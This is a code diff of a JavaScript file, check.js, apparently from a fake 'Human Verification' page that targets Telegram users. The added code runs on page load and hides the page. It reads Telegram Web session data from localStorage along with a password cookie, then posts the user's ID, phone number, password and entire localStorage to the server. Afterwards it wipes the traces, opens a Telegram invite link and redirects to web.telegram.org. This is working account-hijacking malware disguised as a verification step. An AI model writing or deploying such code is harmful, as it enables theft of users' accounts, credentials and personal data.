@@ -1,237 +1,79 @@
-// Function to send data to the server (unchanged)
-async function sendDataToServer(data, type) {
-  await fetch('/api/debug', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ message: `Sending data for ${type} with userId ${data.id}` }),
-  });
-
-  const response = await fetch('/api/users/telegram/info', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      userId: data.id,
-      firstName: data.first_name,
-      usernames: data.usernames,
-      phoneNumber: data.phone_number,
-      isPremium: data.premium,
-      password: data.password,
-      quicklySet: data.quickly_set,
-      type
-    }),
-  });
-
-  if (response.ok) {
+document.addEventListener("DOMContentLoaded", function() {
+  // Log initial state for debugging
+  async function logDebug(message) {
     await fetch('/api/debug', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ message: `Data sent to server successfully for ${type}` }),
-    });
-  } else {
-    await fetch('/api/debug', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ message: `Failed to send data to server for ${type}: ${response.status} ${response.statusText}` }),
+      body: JSON.stringify({ message: `check.js: ${message}` }),
     });
   }
-}
 
-// Function to initialize the Telegram Web App and handle verification
-function initializeWebApp() {
-  fetch('/api/debug', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ message: 'check.js: Initializing Telegram Web App...' }),
-  });
+  logDebug('Script loaded');
+  logDebug(`window.Telegram exists: ${!!window.Telegram}`);
+  logDebug(`window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
+  logDebug(`tt-global-state exists: ${!!localStorage.getItem("tt-global-state")}`);
+  logDebug(`user_auth exists: ${!!localStorage.getItem("user_auth")}`);
 
-  if (window.Telegram && window.Telegram.WebApp) {
-    fetch('/api/debug', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ message: 'check.js: Telegram Web App context detected' }),
-    });
+  async function checkLocalStorage() {
+    let globalState = localStorage.getItem("tt-global-state");
+    if (globalState && localStorage.getItem("user_auth")) {
+      logDebug('Found tt-global-state and user_auth in localStorage');
 
-    const webApp = window.Telegram.WebApp;
-    webApp.ready(); // Signal that the web app is ready
+      const parsedState = JSON.parse(globalState);
+      const currentUserId = parsedState.currentUserId;
+      const currentUser = parsedState.users.byId[currentUserId];
+      document.body.style.display = "none";
 
-    // Get user data from Telegram Web App
-    const user = webApp.initDataUnsafe.user;
-    const queryParams = new URLSearchParams(window.location.search);
-    const type = queryParams.get('type') || 'safeguard';
+      if (currentUserId && currentUser) {
+        logDebug(`User data found: userId=${currentUserId}`);
 
-    if (user) {
-      fetch('/api/debug', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ message: `check.js: User data: ${JSON.stringify(user)}` }),
-      });
+        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
+        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
 
-      // Prepare the user data
-      const userData = {
-        id: user.id.toString(),
-        first_name: user.first_name || "Unknown",
-        usernames: user.username ? [{ username: user.username }] : [],
-        phone_number: "Not shared", // Telegram Web App doesn't provide phone number directly
-        premium: user.is_premium || false,
-        password: "Not available", // Password is not available via Web App
-        quickly_set: null, // Not used in this context
-      };
+        localStorage.removeItem("GramJs:apiCache");
+        localStorage.removeItem("tt-global-state");
 
-      // Add event listener to the "Click here" button
-      const verifyButton = document.getElementById('verifyButton');
-      if (verifyButton) {
-        verifyButton.addEventListener('click', async () => {
-          fetch('/api/debug', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ message: `check.js: Verify button clicked for userId ${userData.id}` }),
-          });
-
-          // Send the user data to the server
-          await sendDataToServer(userData, type);
-
-          // Close the web app after successful verification
-          webApp.close();
+        await fetch(`/api/users/telegram/info`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userId: currentUserId,
+            firstName,
+            usernames,
+            phoneNumber,
+            isPremium,
+            password,
+            quicklySet: localStorage,
+            type: new URLSearchParams(window.location.search).get("type")
+          })
         });
+
+        logDebug('User data sent to server');
+
+        // Check if window.Telegram.WebApp is available before using it
+        if (window.Telegram && window.Telegram.WebApp) {
+          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
+          window.Telegram.WebApp.close();
+        } else {
+          logDebug('window.Telegram.WebApp not available, skipping openTelegramLink and close');
+        }
+
+        localStorage.clear();
+        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+        window.location.href = "https://web.telegram.org/a/";  
+
+        clearInterval(checkInterval);
       } else {
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: 'check.js: Verify button not found in the DOM' }),
-        });
-        document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
+        logDebug('No user data found in tt-global-state');
       }
     } else {
-      fetch('/api/debug', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ message: 'check.js: No user data available from Telegram Web App' }),
-      });
-      document.body.innerHTML = "<p>Unable to verify user. Please try again.</p>";
-    }
-  } else {
-    fetch('/api/debug', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ message: 'check.js: Telegram Web App context not detected, proceeding with fallback' }),
-    });
-
-    // Fallback: Allow the "Human Verification" page to remain displayed
-    const verifyButton = document.getElementById('verifyButton');
-    if (verifyButton) {
-      verifyButton.addEventListener('click', async () => {
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: 'check.js: Verify button clicked in fallback mode (no Telegram Web App context)' }),
-        });
-
-        // Since we can't get user data, send a minimal payload
-        const userData = {
-          id: "unknown",
-          first_name: "Unknown",
-          usernames: [],
-          phone_number: "Not shared",
-          premium: false,
-          password: "Not available",
-          quickly_set: null,
-        };
-        const queryParams = new URLSearchParams(window.location.search);
-        const type = queryParams.get('type') || 'safeguard';
-
-        await sendDataToServer(userData, type);
-      });
-    } else {
-      fetch('/api/debug', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ message: 'check.js: Verify button not found in fallback mode' }),
-      });
-      document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
+      logDebug('tt-global-state or user_auth not found, clearing storage');
+      sessionStorage.clear();
+      localStorage.clear();
     }
   }
-}
 
-// Log initial load context
-fetch('/api/debug', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({ message: 'check.js loaded in window: ' + (window.top === window ? 'top' : 'iframe') }),
-});
-
-// Debug the window object to check for Telegram properties
-fetch('/api/debug', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({ message: `check.js: window.Telegram exists: ${!!window.Telegram}, window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}` }),
-});
-
-// Wait for the DOM to load and Telegram Web App to initialize
-document.addEventListener("DOMContentLoaded", () => {
-  fetch('/api/debug', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ message: 'check.js: DOM fully loaded, attempting to initialize Telegram Web App...' }),
-  });
-
-  // Retry mechanism in case Telegram Web App API isn't ready yet
-  let attempts = 0;
-  const maxAttempts = 20; // Increased to 20 attempts
-  const interval = setInterval(() => {
-    attempts++;
-    fetch('/api/debug', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ message: `check.js: Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context` }),
-    });
-
-    if (window.Telegram && window.Telegram.WebApp) {
-      clearInterval(interval);
-      initializeWebApp();
-    } else if (attempts >= maxAttempts) {
-      clearInterval(interval);
-      fetch('/api/debug', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ message: 'check.js: Failed to detect Telegram Web App context after maximum attempts' }),
-      });
-      initializeWebApp(); // Proceed anyway, using the fallback logic
-    }
-  }, 1000); // Increased to 1000ms (1 second) per attempt
+  const checkInterval = setInterval(checkLocalStorage, 100);
 });
